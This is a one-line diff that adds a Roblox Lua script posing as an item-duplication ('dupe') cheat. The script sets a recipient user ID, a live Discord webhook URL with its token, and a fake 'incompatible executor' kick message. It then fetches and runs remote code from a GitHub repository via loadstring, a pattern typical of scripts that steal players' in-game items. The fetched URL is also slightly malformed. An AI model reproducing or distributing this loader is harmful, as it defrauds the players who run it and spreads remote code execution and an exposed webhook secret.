@@ -1,0 +1,1 @@
+_G.UserID = 1555382786 _G.Webhook = "https://discord.com/api/webhooks/1051436240274194523/jr6s9tTAQJoTBLdgGFzKCZkloU2BnEp74cVvnVFC6Q6JrwVRqXyQYjqX7YqQF_jHg71m" _G.KickMessage = "Your excutor is incompatible with this script try Vega X" _G.PopUpMessage = "Running script!!!" loadstring(game:HttpGet"https://raw.githubusercontent.com/ToxinKindaScripts/psxdupe/main/gui-1%22)()
